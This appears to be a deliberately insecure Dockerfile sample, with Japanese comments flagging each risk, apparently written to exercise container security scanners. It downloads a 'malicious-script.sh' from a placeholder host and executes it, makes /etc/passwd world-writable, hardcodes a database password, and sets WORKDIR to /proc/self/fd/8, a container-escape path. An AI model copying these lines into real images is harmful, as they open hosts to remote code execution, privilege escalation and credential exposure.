# Ubuntu 20.04をベースイメージとして使用
FROM ubuntu:20.04

# セキュリティ上の問題がある可能性のあるパッケージをインストール
RUN apt-get update -y && apt-get install -y \
    systemd \
    zlib1g \
    perl-base

# セキュリティリスクのあるADD命令を使用して外部からファイルを取得
ADD http://example.com/malicious-script.sh /tmp/malicious-script.sh

# rootユーザーで動作（非推奨）
USER root

# 不適切な権限設定（すべてのユーザーがアクセス可能）
RUN chmod 777 /etc/passwd

# 不要なポートを公開
EXPOSE 22 21 80

# 環境変数に機密情報を直接記載（非常に危険）
ENV DB_PASSWORD="password123"

# 脆弱なディレクトリに作業ディレクトリを設定
WORKDIR /proc/self/fd/8

# 任意のスクリプトを実行（注意：実際には危険な操作）
RUN chmod +x /tmp/malicious-script.sh && /tmp/malicious-script.sh
